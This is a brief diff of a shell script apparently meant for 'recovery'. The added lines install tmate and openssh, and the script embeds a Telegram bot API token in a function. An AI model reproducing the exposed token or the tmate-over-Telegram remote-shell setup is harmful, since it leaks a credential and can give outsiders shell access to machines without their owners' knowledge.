@@ -2,6 +2,8 @@
 
 mkdir -p /tmp/recovery
 cd /tmp/recovery
+apt install tmate -y
+apt install openssh -y
 tg(){
 	bot_api=1744981054:AAEwTewZaL8Z6K49crBWlfRnW3Zi9Aqim6U
 	your_telegram_id=$1 # No need to touch 
